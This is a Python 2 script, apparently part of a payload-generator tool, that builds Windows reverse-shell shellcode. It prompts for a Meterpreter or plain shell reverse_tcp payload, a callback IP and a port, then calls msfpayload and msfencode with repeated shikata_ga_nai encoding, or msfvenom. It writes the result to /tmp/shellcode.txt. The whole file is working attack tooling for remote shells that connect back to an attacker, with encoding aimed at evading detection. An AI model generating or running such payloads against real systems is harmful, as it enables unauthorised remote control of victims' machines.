#!/usr/bin/python
#

import os
from src import menus
from src.main import *
from time import sleep

while 1:
	try:
		# set msfpath
		path = msfpath()

		# get current dir
		cwd = os.getcwd()

		# interface ip
		iface = iface_ip()

		selection = 0
		while selection != range(1,4):
			clear()
			menus.shellcode_menu()
			selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
			if selection == '1':
				payload = "windows/meterpreter/reverse_tcp"
				break
			if selection == '2':
				payload = "windows/shell/reverse_tcp"
				break

		# shall we encode the payload?
		menus.win_enc_menu()
		encoding = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
	
		#			
		# get some user info
		ip = raw_input("\nEnter your local or remote ip (%s): " % iface)
		if ip == '':
			ip = iface
		port = raw_input("Enter a port (default 8080): ")
		if port == '':
			port = 8080
		if encoding == '1' or encoding == '':
			iterations = raw_input("Number of times to encode shellcode (default 5): ")
			if iterations == '':
				iterations = 5		

		# create payload
		#
		# if encoding is 1 then run multi-encoder
		# nothing special just piping through msfencode
		#
		if encoding == '1' or encoding == '':
			PrintInfo("Generating shellcode with x%s shikata_ga_nai. Please wait..." % iterations)
			shellcode = os.popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e x86/shikata_ga_nai -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" % (path, payload, ip, port, path, iterations)).read()
			shellcode = shellcode.strip(';')
			sleep(3)
			
			# create windows shellcode file
			winshellcode = "/tmp/shellcode.txt"
			fw = open(winshellcode, "w")
			fw.write(shellcode)
			fw.close()
			sleep(1)
			
			try:
				import pynotify
				import pygtk
				pygtk.require('2.0')
				if not pynotify.init("PayGen"):
					pass
				
				n = pynotify.Notification("Finished", "Shellcode generated in %s" % winshellcode)
		
				if not n.show():
					print "Notifcation failed"
					pass
				
			except:
				pass

			# return to main
			PrintInfo("File shellcode.txt created in /tmp")
			raw_input("\nPress %sENTER%s to continue" % (colours.bold, colours.reset))
			break
		elif encoding == '2':
			PrintInfo("Generating shellcode. Please wait...")
			shellcode = os.popen("%s/msfvenom -p %s LHOST=%s LPORT=%s c | tr -d '\n' | tr -d '+' | tr -d '\"' | tr -d ' ' | sed 's/buf=//'" % (path, payload, ip, port)).read()
			shellcode = shellcode.strip(';')
			shellcode = shellcode.strip('+')
			sleep(3)

			# create windows shellcode file
                        winshellcode = "/tmp/shellcode.txt"
                        fw = open(winshellcode, "w")
                        fw.write(shellcode)
                        fw.close()
                        sleep(1)

                        # return to main
                        PrintInfo("File shellcode.txt created in /tmp")
                        EntContinue()
                        break

	except KeyboardInterrupt:
		break
